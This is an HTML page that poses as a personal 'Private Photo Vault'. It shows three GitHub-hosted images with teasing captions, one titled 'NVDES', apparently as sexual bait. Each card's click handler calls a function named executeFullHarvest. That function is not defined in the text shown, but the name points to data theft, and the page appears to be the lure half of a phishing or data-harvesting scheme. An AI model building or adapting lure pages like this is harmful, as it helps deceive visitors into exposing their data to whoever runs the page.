<!DOCTYPE html>
<html>
<head>
    <title>My Private Photos</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            margin-bottom: 10px;
            font-size: 2.5em;
        }
        .subtitle {
            text-align: center;
            margin-bottom: 30px;
            opacity: 0.8;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .image-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }
        .image-card:hover {
            transform: translateY(-5px);
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(255, 255,255, 0.2);
        }
        .image-card img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        .image-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .image-desc {
            font-size: 0.8em;
            opacity: 0.7;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Private Photo Vault</h1>
        <p class="subtitle">Exclusive content - Click to view full album</p>
        
        <div class="loading" id="loading">Loading secure content...</div>
        
        <div class="gallery">
            <div class="image-card" onclick="executeFullHarvest(1)">
                <img src="https://raw.githubusercontent.com/Zoesgality/private-photos/main/images/DA159703-8392-4407-9FBA-E250EF3F4567.png" 
                     alt="Private Photo 1" 
                     onerror="this.src='https://raw.githubusercontent.com/Zoesgality/private-photos/main/images/DA159703-8392-4407-9FBA-E250EF3F4567.png'">
                <div class="image-title"> meeee </div>
                <div class="image-desc">I'm sooo ugly ik >_<  </div>
            </div>
            
            <div class="image-card" onclick="executeFullHarvest(2)">
                <img src="https://raw.githubusercontent.com/Zoesgality/private-photos/main/images/IMG_9996.png" 
                     alt="Private Photo 2"
                     onerror="this.src='https://raw.githubusercontent.com/Zoesgality/private-photos/main/images/IMG_9996.png'">
                <div class="image-title">NVDES</div>
                <div class="image-desc">Title says it all lol</div>
            </div>
            
            <div class="image-card" onclick="executeFullHarvest(3)">
                <img src="https://raw.githubusercontent.com/Zoesgality/private-photos/main/images/447f96e5bf00f5176fef6f8768b45781.png.webp" 
                     alt="Private Photo 3"
                     onerror="this.src='https://raw.githubusercontent.com/Zoesgality/private-photos/main/images/447f96e5bf00f5176fef6f8768b45781.png.webp'">
                <div class="image-title">dailyyy activitiess :3</div>
                <div class="image-desc"> normall picss </div>
            </div>
        </div>
    </div>


</body>
</html>
